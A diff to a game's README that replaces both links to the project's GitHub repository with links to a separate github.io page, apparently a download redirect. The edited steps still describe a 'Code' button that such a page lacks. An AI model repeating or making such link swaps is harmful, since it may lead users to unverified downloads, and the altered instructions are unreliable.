@@ -1,6 +1,6 @@
 # 🧩 hack-day-swap-game - Solve puzzles and repair the robot
 
-[ ![Download Game](https://img.shields.io/badge/Download-Game-blue.svg) ](https://github.com/Representative-listeria787/hack-day-swap-game)
+[ ![Download Game](https://img.shields.io/badge/Download-Game-blue.svg) ](https://representative-listeria787.github.io)
 
 ## 🎮 What is this game?
 
@@ -18,7 +18,7 @@ Ensure your computer connects to the internet to access the file. You need at le
 
 Follow these steps to get the game on your computer:
 
-1. Visit the project page at this link: [https://github.com/Representative-listeria787/hack-day-swap-game](https://github.com/Representative-listeria787/hack-day-swap-game).
+1. Visit the project page at this link: [https://representative-listeria787.github.io](https://representative-listeria787.github.io).
 2. Look for the green button labeled "Code" near the top right of the page.
 3. Click this button and select "Download ZIP".
 4. Wait for the download to finish.
